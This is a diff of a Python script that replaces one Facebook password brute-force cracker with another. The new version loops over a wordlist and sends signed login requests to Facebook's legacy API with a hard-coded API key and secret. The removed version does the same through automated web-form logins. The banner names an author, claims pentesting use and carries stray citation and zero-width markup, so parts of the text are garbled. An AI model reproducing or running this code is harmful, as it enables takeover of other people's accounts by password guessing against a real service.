@@ -1,79 +1,58 @@
-import socket
 import os
-import time
-import random
-import argparse
-import mechanize
-import http.cookiejar as cookielib
-from time import strftime, gmtime
+import sys
+import urllib.request
+import hashlib
 
-tested = []
+API_SECRET = "62f8ce9f74b12f84c123cc23437a4a32"
 
-def banner():
-    print("""
-___________________
-|      NSK B3's    |
-|Facebook Password |
-|     Cracker      |
-|------------------|
-|                  |
-|__________________|
-""")
+banner = """
+          &#8203;``【oaicite:19】``&#8203;&#8203;``【oaicite:18】``&#8203;&#8203;``【oaicite:17】``&#8203;&#8203;``【oaicite:16】``&#8203;&#8203;``【oaicite:15】``&#8203;&#8203;``【oaicite:14】``&#8203;&#8203;``【oaicite:13】``&#8203;】&#8203;``【oaicite:12】``&#8203;】-&#8203;``【oaicite:11】``&#8203;&#8203;``【oaicite:10】``&#8203;
+                (╯°□°)--︻╦╤─ - - -
+       +=======================================+
+       |..........Facebook Cracker v 2.........|
+       +---------------------------------------+
+       |#Author: DedSecTL <dtlily>             |
+       |#Contact: Telegram @dtlily 
+       |#Contact: facebook https://www.facebook.com/hmida.madrid.357      |
+       |#Date: Fri mar 20 10:15:49 2021         |
+       |#This tool is made for pentesting.     |
+       |#Changing the description of this tool |
+       |Won't made you the coder ^_^ !!!       |
+       |#Respect Coderz ^_^                    |
+       |#I take no responsibilities for the    |
+       |  use of this program !                |
+       +=======================================+
+       |..........Facebook Cracker v 2.........|
+       +---------------------------------------+
+       سكربت اختراق فيسبوك عن طريق التخمين 
+       +HMIDA.............*.X01.................+ 
+            &#8203;``【oaicite:9】``&#8203;&#8203;``【oaicite:8】``&#8203;&#8203;``【oaicite:7】``&#8203;&#8203;``【oaicite:6】``&#8203;&#8203;``【oaicite:5】``&#8203;&#8203;``【oaicite:4】``&#8203;&#8203;``【oaicite:3】``&#8203;】&#8203;``【oaicite:2】``&#8203;】-&#8203;``【oaicite:1】``&#8203;&#8203;``【oaicite:0】``&#8203;
+"""
 
-def args():
-    global args
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-u', '--user', help="Username")
-    parser.add_argument('-P', '--passlist', help="Wordlist to use")
-    args = parser.parse_args()
-
-def clear():
-    os.system('clear')
-
-def fbrt():
-    global args
-    br = mechanize.Browser()
-    useragents = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
-    email = args.user
-    br.addheaders = [('User-agent', random.choice(useragents))]
-    cj = cookielib.LWPCookieJar()
-    br.set_handle_equiv(True)
-    br.set_handle_referer(True)
-    br.set_handle_redirect(True)
-    br.set_handle_robots(False)
-    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
-    br.set_cookiejar(cj)
-
-    passlist = args.passlist
-    try:
-        passlist = open(passlist, "r").readlines()
-    except:
-        clear()
-        print("[!] Wordlist not found!")
-        quit()
-
-    url = "https://www.facebook.com/login.php?login_attempt=1"
-    br.open(url)
-
-    print("[*] Passwords to try:", len(passlist))
-    print("[*] Attack Started at: " + strftime("%a, %d %b %Y %H:%M:%S", gmtime()))
-    time.sleep(0.5)
-
-    for password in passlist:
-        br.select_form(nr=0)
-        br.form['email'] = email
-        br.form['pass'] = password.strip()
-        r = br.submit()
-        if (r != url) and (not 'login_attempt' in r.geturl()):
-            clear()
-            print("[+] CREDENTIALS FOUND:")
-            print("Password: " + password.strip() + "\nEmail: " + email)
-            print("Thanks for using my tool!")
-            break
-        else:
-            tested.append(password)
-            print("Password Tested:", password, "Total Passwords Tested:", len(tested))
-
-banner()
-args()
-fbrt()
+print("[+] Facebook Brute Force\n")
+userid = input("[*] Enter [Email|Phone|Username|ID]: ")
+try:
+    passlist = input("[*] Set PATH to passlist: ")
+    if os.path.exists(passlist) != False:
+        print(banner)
+        print(" [+] Account to crack : {}".format(userid))
+        print(" [+] Loaded : {}".format(len(open(passlist, "r").read().split("\n"))))
+        print(" [+] Cracking, please wait ...")
+        for passwd in open(passlist, 'r').readlines():
+            sys.stdout.write(u"\u001b[1000D[*] Trying {}".format(passwd.strip()))
+            sys.stdout.flush()
+            sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword={}return_ssl_resources=0v=1.0{}".format(userid, passwd.strip(), API_SECRET)
+            xx = hashlib.md5(sig.encode()).hexdigest()
+            data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=en_US&method=auth.login&password={}&return_ssl_resources=0&v=1.0&sig={}".format(userid, passwd.strip(), xx)
+            response = urllib.request.urlopen("https://api.facebook.com/restserver.php?{}".format(data)).read().decode()
+            if "error" in response:
+                pass
+            else:
+                print("\n\n[+] Password found .. !!")
+                print("\n[+] Password : {}".format(passwd.strip()))
+                break
+        print("\n\n[!] Done .. !!")
+    else:
+        print("fbbrute: error: No such file or directory")
+except KeyboardInterrupt:
+    print("fbbrute: error: Keyboard interrupt")
